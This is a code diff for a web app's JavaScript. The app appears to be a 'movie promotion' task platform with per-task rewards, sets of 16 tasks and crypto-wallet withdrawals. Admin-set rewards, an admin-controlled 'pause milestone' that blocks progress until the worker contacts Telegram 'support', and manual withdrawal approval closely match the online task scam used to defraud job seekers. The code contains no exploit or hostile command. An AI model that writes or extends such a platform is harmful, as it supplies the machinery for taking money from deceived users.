-
-        if (window.savePicturesToFirebase) {
-          await window.savePicturesToFirebase(key, picObj);
-        }
-        renderUI();
-        alert(`Successfully saved details for Set ${setNum} Movie #${imgIdx}!`);
-      };
-
-      if (fileInput.files && fileInput.files[0]) {
-        const reader = new FileReader();
-        reader.onload = function(e) {
-          applySave(e.target.result);
-        };
-        reader.readAsDataURL(fileInput.files[0]);
-      } else {
-        applySave(null);
-      }
-    }
-
     async function promoteMovie() {
       if (!currentUser || !window.users[currentUser]) return;
 
@@ -840,47 +757,67 @@
         await window.saveUserToFirebase(user);
       }
 
-      document.getElementById('modal-reward-text').innerText = `You earned $${reward.toFixed(2)} for promoting task #${user.completedInSet}!`;
+      document.getElementById('modal-reward-text').innerText = `You earned $${reward.toFixed(2)} for completing promotion #${user.completedInSet}!`;
       document.getElementById('promo-modal').classList.remove('hidden');
-      renderUI();
     }
 
     function closeModal() {
       document.getElementById('promo-modal').classList.add('hidden');
+      renderUI();
+    }
+
+    async function approveNextSet() {
+      const selectedUser = document.getElementById('admin-selected-user').value;
+      if (!selectedUser || !window.users[selectedUser]) {
+        alert('Please select a member first.');
+        return;
+      }
+
+      const user = window.users[selectedUser];
+      if (user.currentSet < 3) {
+        user.currentSet += 1;
+        user.completedInSet = 0;
+        user.stopLimit = 16;
+        user.isSetApproved = true;
+        window.saveUsers();
+        if (window.saveUserToFirebase) {
+          await window.saveUserToFirebase(user);
+        }
+        window.populateAdminUsers();
+        renderUI();
+        alert(`Approved Set for ${selectedUser}! Moved to Set ${user.currentSet}.`);
+      } else {
+        alert(`${selectedUser} has already completed all 3 sets!`);
+      }
     }
 
     async function requestWithdrawal() {
       if (!currentUser || !window.users[currentUser]) return;
-
       const user = window.users[currentUser];
-      const wallet = document.getElementById('withdraw-wallet-address').value.trim();
-      const amount = parseFloat(document.getElementById('withdraw-amount-input').value) || 0;
 
-      if (!wallet) {
-        alert('Please enter your Crypto Wallet Address.');
+      const addr = document.getElementById('withdraw-wallet-address').value.trim();
+      const amt = parseFloat(document.getElementById('withdraw-amount-input').value) || 0;
+
+      if (!addr || amt <= 0) {
+        alert('Please enter a valid wallet address and amount.');
         return;
       }
 
-      if (amount <= 0 || amount > user.balance) {
-        alert('Invalid withdrawal amount or insufficient balance.');
+      if (amt > (user.balance || 0)) {
+        alert('Withdrawal amount exceeds your current available balance!');
         return;
       }
 
-      user.balance -= amount;
-      user.processingBalance = (user.processingBalance || 0) + amount;
       user.withdrawalStatus = 'Pending';
-      user.withdrawalAmount = amount;
-      user.walletAddress = wallet;
+      user.withdrawalAmount = amt;
+      user.walletAddress = addr;
 
       window.saveUsers();
       if (window.saveUserToFirebase) {
         await window.saveUserToFirebase(user);
       }
-
-      alert('Withdrawal request submitted! Funds moved to Processing Balance.');
-      document.getElementById('withdraw-wallet-address').value = '';
-      document.getElementById('withdraw-amount-input').value = '';
       renderUI();
+      alert('Withdrawal request submitted successfully!');
     }
 
     async function approveWithdrawal() {
@@ -888,7 +825,9 @@
       if (!selectedUser || !window.users[selectedUser]) return;
 
       const user = window.users[selectedUser];
-      user.processingBalance = 0;
+      const amt = user.withdrawalAmount || user.balance || 0;
+
+      user.balance = Math.max(0, (user.balance || 0) - amt);
       user.withdrawalStatus = 'Approved';
       user.withdrawalAmount = 0;
 
@@ -898,78 +837,125 @@
       }
       window.populateAdminUsers();
       renderUI();
-      alert(`Approved withdrawal for ${selectedUser}!`);
+      alert(`Withdrawal request approved for ${selectedUser}!`);
+    }
+
+    async function savePictureAndSettings() {
+      const setNum = document.getElementById('edit-set-num').value;
+      const imgIndex = document.getElementById('edit-img-index').value;
+      const reward = parseFloat(document.getElementById('edit-img-reward').value) || 0.50;
+      const comment = document.getElementById('edit-img-comment').value.trim();
+      const fileInput = document.getElementById('edit-img-file');
+
+      const key = `${setNum}-${imgIndex}`;
+      let existingPic = window.globalPictureData[key]?.url || 'https://via.placeholder.com/400x220?text=Movie+Promo';
+
+      if (fileInput.files && fileInput.files[0]) {
+        const reader = new FileReader();
+        reader.onload = async function(e) {
+          const picData = {
+            url: e.target.result,
+            reward: reward,
+            comment: comment || 'Admin Featured Promotion'
+          };
+          window.globalPictureData[key] = picData;
+          window.savePictures();
+          if (window.savePicturesToFirebase) {
+            await window.savePicturesToFirebase(key, picData);
+          }
+          renderUI();
+          alert(`Saved picture and details for Set ${setNum} Picture #${imgIndex}!`);
+        };
+        reader.readAsDataURL(fileInput.files[0]);
+      } else {
+        const picData = {
+          url: existingPic,
+          reward: reward,
+          comment: comment || 'Admin Featured Promotion'
+        };
+        window.globalPictureData[key] = picData;
+        window.savePictures();
+        if (window.savePicturesToFirebase) {
+          await window.savePicturesToFirebase(key, picData);
+        }
+        renderUI();
+        alert(`Saved details for Set ${setNum} Picture #${imgIndex}!`);
+      }
     }
 
     function renderUI() {
       const authView = document.getElementById('auth-view');
       const workerView = document.getElementById('worker-view');
 
-      document.getElementById('telegram-support-btn').href = window.telegramLink;
-      document.getElementById('support-set-link').href = window.telegramLink;
+      const telegramBtn = document.getElementById('telegram-support-btn');
+      const supportSetLink = document.getElementById('support-set-link');
+      if (telegramBtn) telegramBtn.href = window.telegramLink;
+      if (supportSetLink) supportSetLink.href = window.telegramLink;
 
-      if (currentUser && window.users[currentUser]) {
-        authView.classList.add('hidden');
-        workerView.classList.remove('hidden');
+      if (!currentUser || !window.users[currentUser]) {
+        authView.classList.remove('hidden');
+        workerView.classList.add('hidden');
+        return;
+      }
 
-        const user = window.users[currentUser];
-        document.getElementById('user-display-name').innerText = user.username;
-        document.getElementById('current-set-display').innerText = `Set ${user.currentSet || 1} / 3`;
-        document.getElementById('set-num-text').innerText = user.currentSet || 1;
+      authView.classList.add('hidden');
+      workerView.classList.remove('hidden');
 
-        const bal = typeof user.balance === 'number' ? user.balance.toFixed(2) : '0.00';
-        const pBal = typeof user.processingBalance === 'number' ? user.processingBalance.toFixed(2) : '0.00';
+      const user = window.users[currentUser];
+      document.getElementById('user-display-name').innerText = user.username;
+      document.getElementById('current-set-display').innerText = `Set ${user.currentSet || 1} / 3`;
+      document.getElementById('worker-balance').innerText = `$${(user.balance || 0).toFixed(2)}`;
+      document.getElementById('processing-balance').innerText = `$${(user.processingBalance || 0).toFixed(2)}`;
 
-        document.getElementById('worker-balance').innerText = `$${bal}`;
-        document.getElementById('worker-processing-balance').innerText = `$${pBal}`;
+      const completed = user.completedInSet || 0;
+      const maxWork = user.stopLimit || 16;
 
-        const completed = user.completedInSet || 0;
-        document.getElementById('progress-text').innerText = `${completed} / 16 Completed`;
-        document.getElementById('progress-fill').style.width = `${(completed / 16) * 100}%`;
+      document.getElementById('set-num-text').innerText = user.currentSet || 1;
+      document.getElementById('progress-text').innerText = `${completed} / ${maxWork} Completed`;
 
-        // Check Pause / Complete State
-        const maxWork = user.stopLimit || 16;
-        const pausedMsgBox = document.getElementById('completed-set-message');
-        const pauseReasonText = document.getElementById('pause-reason-text');
-        const movieBox = document.getElementById('movie-container');
+      const pct = Math.min(100, Math.round((completed / maxWork) * 100));
+      document.getElementById('progress-fill').style.width = `${pct}%`;
 
-        if (completed >= maxWork || user.isSetApproved === false) {
-          movieBox.classList.add('hidden');
-          pausedMsgBox.classList.remove('hidden');
-          pauseReasonText.innerText = user.pauseMessage || "You have completed this task set! Please contact support to unlock the next set.";
+      const completedMsgBox = document.getElementById('completed-set-message');
+      const movieBox = document.getElementById('movie-container');
+      const pauseReasonText = document.getElementById('pause-reason-text');
+
+      if (completed >= maxWork || user.isSetApproved === false) {
+        completedMsgBox.classList.remove('hidden');
+        movieBox.classList.add('hidden');
+        if (user.pauseMessage) {
+          pauseReasonText.innerText = user.pauseMessage;
         } else {
-          pausedMsgBox.classList.add('hidden');
-          movieBox.classList.remove('hidden');
-
-          const key = `${user.currentSet || 1}-${completed + 1}`;
-          const picData = window.globalPictureData[key] || {};
-
-          document.getElementById('movie-img').src = picData.src || defaultMovies[0].img;
-          document.getElementById('movie-title').innerText = picData.title || `Movie Promotion #${completed + 1}`;
-          document.getElementById('movie-bio').innerText = picData.bio || "Engaging plot storyline summary for movie promotion task.";
-          document.getElementById('admin-comment').innerText = `Admin Comment: ${picData.comment || 'Ready to promote!'}`;
-          document.getElementById('movie-reward').innerText = `$${(picData.reward || 0.50).toFixed(2)}`;
+          pauseReasonText.innerText = "You have reached a pause milestone! Kindly contact customer support to proceed to the next set.";
         }
-
-        // Withdrawal status text
-        const wStatusText = document.getElementById('withdraw-status');
-        if (user.withdrawalStatus === 'Pending') {
-          wStatusText.innerHTML = `<span style="color:var(--warning);">⏳ Pending Withdrawal: $${(user.withdrawalAmount || 0).toFixed(2)}</span>`;
-        } else if (user.withdrawalStatus === 'Approved') {
-          wStatusText.innerHTML = `<span style="color:var(--success);">✅ Last Withdrawal Approved!</span>`;
-        } else {
-          wStatusText.innerText = '';
-        }
-
       } else {
-        if (document.getElementById('admin-view').classList.contains('hidden')) {
-          authView.classList.remove('hidden');
-          workerView.classList.add('hidden');
-        }
+        completedMsgBox.classList.add('hidden');
+        movieBox.classList.remove('hidden');
+
+        const key = `${user.currentSet || 1}-${completed + 1}`;
+        const picObj = window.globalPictureData[key];
+
+        const imgEl = document.getElementById('movie-img');
+        const titleEl = document.getElementById('movie-title');
+        const commentEl = document.getElementById('admin-comment');
+        const rewardEl = document.getElementById('movie-reward');
+
+        imgEl.src = picObj?.url || 'https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?auto=format&fit=crop&w=600&q=80';
+        titleEl.innerText = `Set ${user.currentSet || 1} - Promotion #${completed + 1}`;
+        commentEl.innerText = picObj?.comment ? `Admin Comment: ${picObj.comment}` : 'Admin Comment: Ready to promote!';
+        rewardEl.innerText = `$${parseFloat(picObj?.reward || 0.50).toFixed(2)}`;
+      }
+
+      const wStatus = document.getElementById('withdraw-status');
+      if (user.withdrawalStatus === 'Pending') {
+        wStatus.innerHTML = `<span style="color:var(--warning); font-weight:700;">Withdrawal of $${(user.withdrawalAmount || 0).toFixed(2)} is Pending Approval</span>`;
+      } else if (user.withdrawalStatus === 'Approved') {
+        wStatus.innerHTML = `<span style="color:var(--success); font-weight:700;">Recent Withdrawal Request Approved!</span>`;
+      } else {
+        wStatus.innerText = '';
       }
     }
 
-    // Initial render call
     renderUI();
   </script>
 </body>
